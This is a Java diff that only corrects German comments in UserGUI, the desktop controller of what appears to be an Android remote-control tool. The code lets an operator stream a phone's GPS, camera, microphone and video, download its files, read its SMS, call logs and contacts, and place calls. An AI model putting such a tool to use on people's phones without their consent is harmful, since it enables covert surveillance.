@@ -39,7 +39,7 @@ import javax.swing.JScrollPane;
 import javax.swing.JTextArea;
 
 /**
- * Diese Klasse ist zu Verwaltung der GUI eines verbundenen Geräts und den dazugehörtigen Tabs zuständig.
+ * Diese Klasse ist zu Verwaltung der GUI zuständig.
  */
 public class UserGUI extends JFrame implements WindowListener {
 	
@@ -65,7 +65,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	private GUI gui;
 
 	/**
-	 * Der Konstruktor erstellt eine neue Gui für den Benutzer. Außerdem werden die übergebenen Daten gespeichert.
+	 * Der Konstruktor erstellt eine neue GUI für den Benutzer. Außerdem werden die übergebenen Daten gespeichert.
 	 * @param imei	Die Imei
 	 * @param gui	Die Gui
 	 */
@@ -96,7 +96,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Diese Methode definiert die Aktionen sollte das Fenster geschlossen werden.
+	 * Diese Methode definiert die Aktionen, sollte das Fenster geschlossen werden.
 	 * Hierbei werden sämtliche Streams und Monitoring Aktionen gestoppt.
 	 * @param e	Das Event
 	 */
@@ -123,7 +123,7 @@ public class UserGUI extends JFrame implements WindowListener {
 
 	/**
 	 * Diese Methode ist zum Schließen von einzelnen Tabs zuständig.
-	 * Es wird nicht nur die Klassenvariable auf null gesetzt sondern gegebenen fall auch Streams oder Monitoring beendet.
+	 * Es wird nicht nur die Klassenvariable auf null gesetzt, sondern gegebenenfalls noch aktive Streams oder Monitoringobjekte beendet.
 	 * @param viewer	Das Panel welches geschlossen werden soll.
 	 */
 	public void removeTab(JPanel viewer) {
@@ -163,7 +163,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ********************
 
 	/**
-	 * Erhält ein AdvancedInformationPacket und ruft die updateInformations Mehtode auf um die neuen Daten auf der GUI anzuzeigen.
+	 * Erhält ein AdvancedInformationPacket und ruft die updateInformations Mehtode auf, um die neuen Daten auf der GUI anzuzeigen.
 	 * @param packet	Das Paket
 	 */
 	public void updateHomeInformations(AdvancedInformationPacket packet) {
@@ -171,7 +171,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Bekommt die Preference Daten und ruft die updatePreferences Methode auf um diese auf der GUI anzuzeigen.
+	 * Bekommt die Preference Daten und ruft die updatePreferences Methode auf, um diese auf der GUI anzuzeigen.
 	 * @param ip	Die IP
 	 * @param port	Der Port
 	 * @param wait	wait
@@ -184,14 +184,14 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Diese Methode ruft die fireGetAdvInformations der Klasse Gui auf und übergibt dieser die IMEI.
+	 * Diese Methode ruft die fireGetAdvInformations der Klasse Gui auf, und übergibt dieser die IMEI.
 	 */
 	public void fireGetAdvancedInformations() {
 		gui.fireGetAdvInformations(imei);
 	}
 
 	/**
-	 * Diese Methode ist zum Speichern der Verbindugnsinformationen auf dem Client. Dazu wird die Methode fireSaveConnetcConfiguration der Klasse GUI auf.
+	 * Diese Methode ist zum Speichern der Verbindugnsinformationen auf dem Client. Dazu wird die Methode fireSaveConnetConfiguration der Klasse GUI aufgerufen.
 	 * @param ip	DIe IP
 	 * @param port	Der Port
 	 * @param wait	wait
@@ -231,8 +231,8 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Diese Methode ist zum Anhalten des GPS Steams vorhanden.
-	 * Dazu wird die Methode fiteStopGPSStreaming aufgerufen.
+	 * Diese Methode ist zum Beenden des GPS Steams vorhanden.
+	 * Dazu wird die Methode fireStopGPSStreaming aufgerufen.
 	 */
 	public void fireStopGPSStreaming() {
 		gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
@@ -244,7 +244,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	// *********************
 
 	/**
-	 * Erhält ein Bild als byte-Array und soll die neuen Informationen benutzen und auf dem Bildtab anzeigen.
+	 * Erhält ein Bild als byte-Array präsentiert dies auf der GUI .
 	 * @param picture	Das Bild
 	 */
 	public void updatePicture(byte[] picture) {
@@ -253,7 +253,7 @@ public class UserGUI extends JFrame implements WindowListener {
 
 	/**
 	 * Diese Methode ruft die fireTakePicture Methode der GUI auf.
-	 * Damit wird die Anfrage Bilder zu machen abgesetzt.
+	 * Hiermit wird die Anfrage ein Bild aufzunehmen an den Client gesendet.
 	 */
 	public void fireTakePicture(String cam) {
 		gui.fireTakePicture(imei,cam);
@@ -275,7 +275,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Startet den SoundStream indem die Methode fireStartSoundStreaming.
+	 * Startet den SoundStream, indem die Methode fireStartSoundStreaming aufgerufen wird.
 	 * @param source	Die Quelle des Stream.
 	 */
 	public void fireStartSoundStreaming(int source) {
@@ -295,8 +295,8 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 
 	/**
-	 * Diese Methode ist zum aktualisieren der Videodaten vorahnden.
-	 * @param data	Die Videaodaten
+	 * Diese Methode ist zum aktualisieren der Videodaten vorhanden.
+	 * @param data	Die Videoodaten
 	 */
 	public void addVideoBytes(byte[] data) {
 		if(videoPanel != null)
@@ -311,7 +311,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Methode zum beenden des Videostreams.
+	 * Methode zum Beenden des Videostreams.
 	 */
 	public void fireStopVideoStream(String path, String name) {
 		gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
@@ -330,7 +330,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 
 	/**
-	 * Diese Methode ist zum updatendes FileTreeTabs vorhanden.
+	 * Diese Methode ist zum Aktualisieren des FileTreeTabs.
 	 * @param fileList	Die Ordnerstruktur
 	 */
 	public void updateFileTree(ArrayList<MyFile> fileList) {
@@ -338,7 +338,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Diese Methode ist zum Herunterladen der von Dateien vorhande.
+	 * Diese Methode ist zum Herunterladen von Dateien vorhanden.
 	 * @param path	Der Pfad auf dem Handy
 	 * @param downPath	der Speicherpfad
 	 * @param downName	Der Name der Datei
@@ -348,7 +348,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Ruft die Methode fireTreeFile der Klasse GUI auf.
+	 * Ruft die Methode fireTreeFile der Klasse GUI auf und fordert somit die Ordnerstruktur des Clients an.
 	 */
 	public void fireTreeFile() {
 		gui.fireTreeFile(imei);
@@ -360,7 +360,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 
 	/**
-	 * Diese Methode ist zum Aktualisiern der Anrufliste vorhanden
+	 * Diese Methode ist zum Aktualisiern der Anrufliste vorhanden.
 	 * @param logsList	Die Anrufliste
 	 */
 	public void updateCallLogs(ArrayList<CallPacket> logsList) {
@@ -368,7 +368,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Diese Methode ist zum Absenden einer Anfrage zum erhalten der Anrufliste vorhanden.
+	 * Diese Methode ist zum Absenden einer Anfrage, die Anruflisten auszulesen, zuständig.
 	 * Dazu wird die fireCallLogs Methode der Klasse GUI aufgerufen.
 	 * @param request	Die Filter
 	 */
@@ -390,7 +390,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Diese Methode ist zum Erstellen einer Anfrage zum Erhalten der SMS an den Client vorhanden.
+	 * Diese Methode ist zum Erstellen einer Anfrage, um die SMS des Clients auszulesen.
 	 * @param request	Die Filter
 	 */
 	public void fireGetSMS(String request) {
@@ -403,7 +403,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	// ****************************
 
 	/**
-	 * Diese Methode ist zum Aktualisieren der Daten des Kontakttabs vorhanden.
+	 * Diese Methode ist zum Aktualisieren der Daten des Kontakttabs.
 	 * @param contacts	Die Kontakte
 	 */
 	public void updateContacts(ArrayList<Contact> contacts) {
@@ -418,7 +418,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	}
 
 	/**
-	 * Diese Methode ist um einen Anruf auf dem Client zu starten.
+	 * Diese Methode ist, um einen Anruf auf dem Client zu starten.
 	 * @param number Die Telefonnummer
 	 */
 	public void fireGiveCall(String number) {
